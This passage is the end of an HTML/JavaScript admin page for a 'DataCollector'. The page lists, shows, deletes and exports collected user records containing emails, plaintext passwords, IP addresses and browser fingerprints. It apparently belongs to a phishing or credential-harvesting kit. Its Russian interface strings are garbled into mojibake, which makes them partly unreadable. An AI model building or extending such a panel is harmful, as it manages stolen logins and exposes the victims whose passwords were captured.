                        <div style="height: 8px; background: #e4e6eb; border-radius: 4px; margin-top: 4px;">
                            <div style="height: 100%; width: ${percentage}%; background: #42b72a; border-radius: 4px;"></div>
                        </div>
                    </div>
                `;
            });
            
            html += `
                        </div>
                    </div>
                </div>
            `;
            
            analytics.innerHTML = html;
        }
        
        // –ü—Ä–æ—Å–º–æ—Ç—Ä –¥–µ—Ç–∞–ª–µ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        function viewUserDetails(userId) {
            if (!window.DataCollector) {
                alert('DataCollector –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω');
                return;
            }
            
            const data = DataCollector.loadData();
            const user = data.users.find(u => u.id === userId);
            
            if (user) {
                const details = `
ID: ${user.id || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}
Email: ${user.email || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}
–ü–∞—Ä–æ–ª—å: ${user.password || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}
–í—Ä–µ–º—è: ${user.timestamp || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}
IP: ${user.ipInfo?.ip || 'unknown'}
–ë—Ä–∞—É–∑–µ—Ä: ${user.userAgent || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}
–≠–∫—Ä–∞–Ω: ${user.screenInfo?.width || 0}x${user.screenInfo?.height || 0}
–Ø–∑—ã–∫: ${user.browserInfo?.language || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}
                `;
                
                alert(details);
            } else {
                alert('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω');
            }
        }
        
        // –£–¥–∞–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        function deleteUser(userId) {
            if (confirm('–£–¥–∞–ª–∏—Ç—å —ç—Ç—É –∑–∞–ø–∏—Å—å?')) {
                if (!window.DataCollector) {
                    alert('DataCollector –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω');
                    return;
                }
                
                const data = DataCollector.loadData();
                const initialLength = data.users.length;
                data.users = data.users.filter(u => u.id !== userId);
                
                if (data.users.length < initialLength) {
                    DataCollector.saveData();
                    alert('–ó–∞–ø–∏—Å—å —É–¥–∞–ª–µ–Ω–∞!');
                    loadAdminData();
                } else {
                    alert('–ó–∞–ø–∏—Å—å –Ω–µ –Ω–∞–π–¥–µ–Ω–∞');
                }
            }
        }
        
        // –û—á–∏—Å—Ç–∫–∞ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö
        function clearAllData() {
            if (confirm('–í–ù–ò–ú–ê–ù–ò–ï! –í—ã —Å–æ–±–∏—Ä–∞–µ—Ç–µ—Å—å —É–¥–∞–ª–∏—Ç—å –í–°–ï –¥–∞–Ω–Ω—ã–µ. –≠—Ç–æ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–µ–ª—å–∑—è –æ—Ç–º–µ–Ω–∏—Ç—å. –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å?')) {
                if (!window.DataCollector) {
                    alert('DataCollector –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω');
                    return;
                }
                
                DataCollector.clearData();
                alert('–í—Å–µ –¥–∞–Ω–Ω—ã–µ —É–¥–∞–ª–µ–Ω—ã!');
                loadAdminData();
            }
        }
        
        // –û–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ
        function refreshData() {
            console.log('refreshData –≤—ã–∑–≤–∞–Ω–∞');
            const loader = document.getElementById('loader');
            if (loader) loader.style.display = 'block';
            
            setTimeout(() => {
                loadAdminData();
            }, 300);
        }
        
        // –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ —ç–∫—Å–ø–æ—Ä—Ç–∞
        function showExportModal() {
            console.log('showExportModal –≤—ã–∑–≤–∞–Ω–∞');
            const modal = document.getElementById('exportModal');
            if (modal) {
                modal.style.display = 'flex';
                updateDataPreview();
            }
        }
        
        function closeExportModal() {
            const modal = document.getElementById('exportModal');
            if (modal) {
                modal.style.display = 'none';
            }
        }
        
        function updateDataPreview() {
            const preview = document.getElementById('dataPreview');
            if (!preview || !window.DataCollector) return;
            
            try {
                const data = DataCollector.exportData('json');
                preview.textContent = data.length > 1000 ? data.substring(0, 1000) + '...' : data;
            } catch (error) {
                preview.textContent = '–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö: ' + error.message;
            }
        }
        
        function exportData(format) {
            if (!window.DataCollector) {
                alert('DataCollector –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω');
                return;
            }
            
            try {
                DataCollector.downloadData(format);
                closeExportModal();
            } catch (error) {
                alert('–û—à–∏–±–∫–∞ —ç–∫—Å–ø–æ—Ä—Ç–∞: ' + error.message);
            }
        }
        
        // –ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö
        function showDataPreview() {
            if (!window.DataCollector) {
                alert('DataCollector –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω');
                return;
            }
            
            try {
                const data = DataCollector.exportData('json');
                const newWindow = window.open();
                newWindow.document.write(`
                    <html>
                    <head>
                        <title>–ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö</title>
                        <style>
                            body { font-family: monospace; padding: 20px; background: #f5f5f5; }
                            pre { background: white; padding: 20px; border-radius: 8px; overflow: auto; }
                        </style>
                    </head>
                    <body>
                        <h2>üìã –ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö (JSON)</h2>
                        <pre>${data}</pre>
                    </body>
                    </html>
                `);
            } catch (error) {
                alert('–û—à–∏–±–∫–∞: ' + error.message);
            }
        }
        
        // –ü–µ—Ä–µ—Ö–æ–¥ –≤ —Ä–µ–∂–∏–º –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä–∞
        function goToPreview() {
            window.open('index.html', '_blank');
        }
        
        // –í—ã—Ö–æ–¥ –∏–∑ –∞–¥–º–∏–Ω–∫–∏
        function logoutAdmin() {
            localStorage.removeItem('admin_authenticated');
            window.location.reload();
        }
        
        // –ì–æ—Ä—è—á–∏–µ –∫–ª–∞–≤–∏—à–∏
        document.addEventListener('keydown', function(e) {
            // F5 - –æ–±–Ω–æ–≤–∏—Ç—å
            if (e.key === 'F5') {
                e.preventDefault();
                refreshData();
            }
            
            // Ctrl+E - —ç–∫—Å–ø–æ—Ä—Ç
            if (e.ctrlKey && e.key === 'e') {
                e.preventDefault();
                showExportModal();
            }
            
            // Ctrl+D - –æ—á–∏—Å—Ç–∏—Ç—å
            if (e.ctrlKey && e.key === 'd') {
                e.preventDefault();
                clearAllData();
            }
            
            // Ctrl+P - –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä
            if (e.ctrlKey && e.key === 'p') {
                e.preventDefault();
                showDataPreview();
            }
            
            // Ctrl+Q - –≤—ã—Ö–æ–¥
            if (e.ctrlKey && e.key === 'q') {
                e.preventDefault();
                logoutAdmin();
            }
        });
    </script>
</body>
</html>
